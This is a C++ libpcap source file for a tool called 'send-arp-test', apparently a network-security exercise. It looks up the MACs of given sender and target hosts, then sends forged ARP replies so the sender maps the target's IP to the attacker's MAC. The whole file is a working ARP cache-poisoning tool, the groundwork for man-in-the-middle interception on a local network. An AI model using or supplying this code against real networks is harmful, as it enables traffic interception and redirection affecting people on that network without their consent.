#include <cstdio>
#include <pcap.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface> <sender IP> <target IP> ...\n");
    printf("sample: send-arp-test wlan0 10.0.0.1 10.0.0.2\n");
}

void get_network_info(const char *iface, char *my_ipv4, uint8_t my_mac[6]) {
    struct ifaddrs *ifaddr, *ifa;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL || !(ifa->ifa_flags & IFF_UP)) continue;

        if (strcmp(ifa->ifa_name, iface) == 0 && ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *addr = (struct sockaddr_in *)ifa->ifa_addr;
            inet_ntop(AF_INET, &addr->sin_addr, my_ipv4, INET_ADDRSTRLEN);
        }

        if (strcmp(ifa->ifa_name, iface) == 0 && ifa->ifa_addr->sa_family == AF_PACKET) {
            struct sockaddr_ll *s = (struct sockaddr_ll *)ifa->ifa_addr;
            memcpy(my_mac, s->sll_addr, 6);
        }
    }

    freeifaddrs(ifaddr);
}

void send_arp_packet(pcap_t* pcap, uint8_t eth_dmac[6], uint8_t eth_smac[6], uint16_t arp_op,
                     uint8_t arp_smac[6],    char* sip, uint8_t arp_tmac[6], char* tip)
{
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(arp_op);
    packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(tip));

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

bool is_arp(u_int16_t ether_type) {
    if(ntohs(ether_type) == 0x0806) return true;
    else                                return false;
}

bool is_reply(u_int16_t arp_op) {
    if(ntohs(arp_op) == 2) return true;
    else                                return false;
}

void get_target_mac(pcap_t* pcap, char* my_ipv4, char* sender_ip, uint8_t* resolved_mac)
{
    while (true) {
        struct pcap_pkthdr *header;
        const u_char *recv_packet;

        int res = pcap_next_ex(pcap, &header, &recv_packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }
        struct EthHdr* eth = (struct EthHdr*)recv_packet;
        if(!is_arp(eth->type_)) continue;

        struct ArpHdr* arp = (struct ArpHdr*)(recv_packet + sizeof(struct EthHdr));
        if(!is_reply(arp->op_)) continue;

        if (ntohl(arp->tip_) == htonl((uint32_t)inet_addr(my_ipv4))) {
            if(ntohl(arp->sip_) == htonl((uint32_t)inet_addr(sender_ip))){
                memcpy(resolved_mac, (uint8_t*)arp->smac_, ETHER_ADDR_LEN);
                break;
            }
        }
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2 == 1 && argc >= 4)) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return EXIT_FAILURE;
	}

    uint8_t my_mac[6] = {0};
    uint8_t sender_eth_mac[6] = {0};
    uint8_t target_eth_mac[6] = {0};
    char my_ipv4[INET_ADDRSTRLEN] = {0};

    get_network_info(dev, my_ipv4, my_mac);

    for(int i = 2; i < argc; i += 2){
        char* sender_ip = argv[i];
        char* target_ip = argv[i + 1];

        const char *eth_dmac_str = "ffffffffffff";
        uint8_t eth_dmac[6] = {0};
        uint8_t arp_tmac[6] = {0};

        sscanf(eth_dmac_str, "%2hhx%2hhx%2hhx%2hhx%2hhx%2hhx",
               &eth_dmac[0], &eth_dmac[1], &eth_dmac[2], &eth_dmac[3], &eth_dmac[4], &eth_dmac[5]);
        send_arp_packet(pcap, eth_dmac, my_mac, ArpHdr::Request, my_mac, my_ipv4, arp_tmac, sender_ip);
        get_target_mac(pcap, my_ipv4, sender_ip, sender_eth_mac);

        send_arp_packet(pcap, eth_dmac, my_mac, ArpHdr::Request, my_mac, my_ipv4, arp_tmac, target_ip);
        get_target_mac(pcap, my_ipv4, target_ip, target_eth_mac);

        send_arp_packet(pcap, sender_eth_mac, my_mac, ArpHdr::Reply, my_mac, target_ip, sender_eth_mac, sender_ip);

    }

	pcap_close(pcap);
}
